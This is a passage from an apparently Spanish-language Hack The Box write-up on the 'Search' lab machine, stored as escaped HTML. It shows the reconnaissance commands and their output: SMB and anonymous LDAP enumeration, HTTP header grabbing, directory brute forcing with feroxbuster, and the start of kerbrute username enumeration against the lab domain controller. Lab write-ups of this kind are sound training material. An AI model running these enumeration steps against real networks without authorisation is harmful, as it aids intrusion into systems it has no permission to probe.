SMB         10.10.11.129    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.11.129    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
SMB         10.10.11.129    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt;Access Denied&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; A process has requested access to an object but has not been granted those access rights.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 œÄ ~/htb/search 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ldap&#34;&gt;Ldap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;ldap&lt;/code&gt; necesita de credenciales para obtener informaci√≥n.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ ldapsearch -x -h 10.10.11.129 -s base namingcontexts
&lt;span class=&#34;c1&#34;&gt;# extended LDIF&lt;/span&gt;
#
&lt;span class=&#34;c1&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# base &amp;lt;&amp;gt; (default) with scope baseObject&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# requesting: namingcontexts&lt;/span&gt;
#

#
dn:
namingcontexts: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;search,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
namingcontexts: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;search,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
namingcontexts: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;search,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
namingcontexts: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;search,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
namingcontexts: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;search,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb

&lt;span class=&#34;c1&#34;&gt;# search result&lt;/span&gt;
search: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
result: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Success

&lt;span class=&#34;c1&#34;&gt;# numResponses: 2&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# numEntries: 1&lt;/span&gt;
 œÄ ~/htb/search ‚ùØ ldapsearch -x -h 10.10.11.129 -D &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -w &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -b &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC=search,DC=htb&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# extended LDIF&lt;/span&gt;
#
&lt;span class=&#34;c1&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# base &amp;lt;DC=search,DC=htb&amp;gt; with scope subtree&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# requesting: ALL&lt;/span&gt;
#

&lt;span class=&#34;c1&#34;&gt;# search result&lt;/span&gt;
search: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
result: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt; must be completed on the connection., data 0, v4563

&lt;span class=&#34;c1&#34;&gt;# numResponses: 1&lt;/span&gt;
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Los Headers del sitio web muestran que corre un &lt;code&gt;Microsoft IIS 10&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ curl -sI 10.10.11.129
HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
Content-Length: &lt;span class=&#34;m&#34;&gt;44982&lt;/span&gt;
Content-Type: text/html
Last-Modified: Tue, &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 10:13:04 GMT
Accept-Ranges: bytes
ETag: &lt;span class=&#34;s2&#34;&gt;&amp;#34;5f3800c86fd61:0&amp;#34;&lt;/span&gt;
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; 23:03:12 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El sitio web presenta servicios, caracteristicas e informaci√≥n sobre la empresa (team, testimonios, etc.), adem√°s, en el formulario de contacto observamos el dominio &lt;code&gt;search.htb&lt;/code&gt; el cual agregamos a &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;br /&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    Full Website
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/Screenshot_full_website.png&#34; alt=&#34;image&#34; /&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;feroxbuster&lt;/code&gt; muestra multiples paginas, una de ellas es &lt;code&gt;/staff&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ feroxbuster -u http://search.htb -w &lt;span class=&#34;nv&#34;&gt;$MD&lt;/span&gt; --depth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -x asp,aspx,html

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ü§ì                 ver: 2.5.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://search.htb
 üöÄ  Threads               ‚îÇ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üí•  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        ‚îÇ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.5.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üí≤  Extensions            ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;asp, aspx, html&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üèÅ  HTTP methods          ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GET&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üîÉ  Recursion Depth       ‚îÇ &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      148c http://search.htb/images &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/images/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET     1030l     2969w    44982c http://search.htb/index.html
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET       17l       76w      931c http://search.htb/main.html
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      148c http://search.htb/Images &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/Images/
&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt;      GET       29l       92w     1233c http://search.htb/staff
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      145c http://search.htb/css &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/css/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET     1030l     2969w    44982c http://search.htb/Index.html
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      144c http://search.htb/js &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/js/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET       17l       76w      931c http://search.htb/Main.html
&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt;      GET       29l       92w     1233c http://search.htb/Staff
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      147c http://search.htb/fonts &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/fonts/
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      148c http://search.htb/IMAGES &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/IMAGES/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET     1030l     2969w    44982c http://search.htb/INDEX.html
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      147c http://search.htb/Fonts &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/Fonts/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      373l     1419w    19559c http://search.htb/single.html
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      145c http://search.htb/CSS &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/CSS/
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        2l       10w      144c http://search.htb/JS &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://search.htb/JS/
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET       17l       76w      931c http://search.htb/MAIN.html
&lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;      GET       80l      276w     3420c http://search.htb/%22julie%20roehm%22.aspx
&lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;      GET       80l      276w     3420c http://search.htb/%22james%20kim%22.aspx
&lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;      GET       80l      276w     3420c http://search.htb/%22britney%20spears%22.aspx
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;restricted-site&#34;&gt;Restricted Site&lt;/h2&gt;
&lt;p&gt;Tras visitar la pagina &lt;code&gt;/staff&lt;/code&gt; nos muestra que las credenciales que proporcionamos no tienen permisos para acceder a esta pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_403_095841.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Si recordamos, &lt;code&gt;nmap&lt;/code&gt; muestra el puerto 445 (https), tras agregar &lt;code&gt;https&lt;/code&gt; al sitio, observamos que pregunta por un certificado, por lo que para acceder a esta p√°gina es necesario contar con uno.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_403_095748.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;enum-users&#34;&gt;Enum Users&lt;/h1&gt;
&lt;h2 id=&#34;kerbrute&#34;&gt;Kerbrute&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeraci√≥n de usuarios utilizando un wordlist de &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;SecList&lt;/a&gt;, encontramos dos usuarios v√°lidos. Sin embargo no obtuvimos mucha informaci√≥n en los diferentes servicios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ ./kerbrute userenum -d search.htb xato-net-10-million-usernames-dup.txt --dc 10.10.11.129 -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/

Version: v1.0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 19:10:24 &amp;gt;  Using KDC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
